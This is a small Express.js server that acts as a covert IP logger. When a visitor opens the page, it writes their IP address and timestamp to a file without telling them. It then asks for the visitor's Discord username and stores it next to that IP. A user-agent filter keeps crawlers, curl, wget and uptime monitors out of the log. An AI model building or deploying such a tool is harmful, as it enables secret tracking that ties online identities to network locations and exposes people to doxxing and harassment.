const express = require("express");
const fs = require("fs");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

// Detect bots by User-Agent
function isBot(req) {
    const ua = req.headers["user-agent"]?.toLowerCase() || "";
    const botPatterns = [
        "bot", "crawler", "spider", "curl", "wget", "headless", "python",
        "uptime", "monitor", "postman", "axios", "node-fetch"
    ];
    return botPatterns.some(pattern => ua.includes(pattern));
}

app.get("/", (req, res) => {
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    // Save IP only if not a bot
    if (!isBot(req)) {
        console.log("New visitor IP:", ip);
        fs.appendFile("ips.txt", `${ip} - VISITED - ${new Date().toLocaleString()}\n`, (err) => {
            if (err) console.log(err);
        });
    } else {
        console.log("Skipped bot:", req.headers["user-agent"]);
    }

    // Show form
    res.send(`
        <html>
            <head><title>Hi!</title></head>
            <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 100px;">
                <h2>Hi! Please enter your Discord username!</h2>
                <form method="POST" action="/submit">
                    <input type="text" name="discord" placeholder="Discord username" style="padding: 8px; width: 250px;" />
                    <button type="submit" style="padding: 8px 16px;">Submit</button>
                </form>
            </body>
        </html>
    `);
});

app.post("/submit", (req, res) => {
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const discord = req.body.discord || "No username provided";

    // Log username + IP (skip bots)
    if (!isBot(req)) {
        fs.appendFile("ips.txt", `${ip} - Discord: ${discord} - ${new Date().toLocaleString()}\n`, (err) => {
            if (err) console.log(err);
        });
    }

    // Thank user
    res.send(`
        <html>
            <head><title>Thanks!</title></head>
            <body style="text-align: center; margin-top: 100px; font-family: Arial, sans-serif;">
                <h2>Thanks! Your username has been received.</h2>
            </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}!`);
});
